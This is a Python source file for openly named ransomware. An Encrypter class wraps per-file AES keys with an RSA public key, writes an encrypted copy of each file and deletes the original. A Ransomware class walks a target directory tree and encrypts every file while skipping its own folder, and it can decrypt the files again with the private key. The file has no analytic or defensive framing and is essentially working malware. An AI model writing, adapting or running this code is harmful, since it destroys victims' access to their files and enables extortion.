import os
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
import struct
import config

class Encrypter:
    def __init__(self, pub_key):
        self.public_key = pub_key

    def encrypt(self, in_file: str, out_file: str):
        # fresh key + IV per file
        aes_key = os.urandom(32)
        aes_iv  = os.urandom(16)

        # lock the AES key and IV with RSA so only the private key can recover them
        encrypted_aes_key = self.public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
        encrypted_aes_iv = self.public_key.encrypt(
            aes_iv,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )

        with open(out_file, "wb") as output:
            # envelope: [key_len (4B)][enc_key][enc_iv][ciphertext]
            output.write(struct.pack("<I", len(encrypted_aes_key)))
            output.write(encrypted_aes_key)
            output.write(encrypted_aes_iv)

            cipher = Cipher(
                algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend()
            )
            encryptor = cipher.encryptor()
            padder = sym_padding.PKCS7(128).padder()

            # stream in 64KB chunks — keeps memory flat for large files
            with open(in_file, "rb") as inp:
                while chunk := inp.read(65536):
                    output.write(encryptor.update(padder.update(chunk)))

            # pad before finalize, always
            output.write(encryptor.update(padder.finalize()))
            output.write(encryptor.finalize())

        os.remove(in_file)

    def decrypt(self, input_path: str, output_path: str, private_key):
        with open(input_path, "rb") as inp:
            # read envelope header
            key_len = struct.unpack("<I", inp.read(4))[0]
            encrypted_aes_key = inp.read(key_len)
            encrypted_aes_iv  = inp.read(256)  # RSA-2048 always outputs 256 bytes

            # unwrap key + IV with private key
            aes_key = private_key.decrypt(
                encrypted_aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
            aes_iv = private_key.decrypt(
                encrypted_aes_iv,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )

            cipher = Cipher(
                algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend()
            )
            decryptor = cipher.decryptor()
            unpadder = sym_padding.PKCS7(128).unpadder()

            with open(output_path, "wb") as output:
                while chunk := inp.read(65536):
                    output.write(unpadder.update(decryptor.update(chunk)))

                # flush decryptor then strip padding
                output.write(unpadder.update(decryptor.finalize()))
                output.write(unpadder.finalize())

        os.remove(input_path)


class Ransomware:
    def __init__(self, target_dir, encrypter):
        self.target_dir = target_dir
        self.encrypter  = encrypter

    def encrypt_files(self):
        exe_dir = os.path.dirname(os.path.abspath(__file__))

        for root, dirs, files in os.walk(self.target_dir):
            # skip project dir entirely — prunes subtree too
            if config.BINARY_NAME in root:
                dirs.clear()
                continue

            for file in files:
                file_path = os.path.join(root, file)

                if file_path.endswith(".enc"):
                    continue
                if os.path.dirname(file_path) == exe_dir:
                    continue

                try:
                    self.encrypter.encrypt(file_path, file_path + ".enc")
                except PermissionError as ex:
                    print(f"Skipping {file_path} - no permission: {ex}")
                except OSError as ex:
                    print(f"Skipping {file_path} - in use or IO error: {ex}")
                except Exception as ex:
                    print(f"Skipping {file_path} - error: {ex}")

    def decrypt_files(self, start_path: str, private_key):
        exe_dir = os.path.dirname(os.path.abspath(__file__))

        for root, dirs, files in os.walk(start_path):
            for file in files:
                file_path = os.path.join(root, file)

                if not file_path.endswith(".enc"):
                    continue
                if os.path.dirname(file_path) == exe_dir:
                    continue

                output_path = file_path.replace(".enc", "")

                try:
                    self.encrypter.decrypt(file_path, output_path, private_key)
                except PermissionError as ex:
                    print(f"Skipping {file_path} - no permission: {ex}")
                except OSError as ex:
                    print(f"Skipping {file_path} - in use or IO error: {ex}")
                except Exception as ex:
                    print(f"Skipping {file_path} - error: {ex}")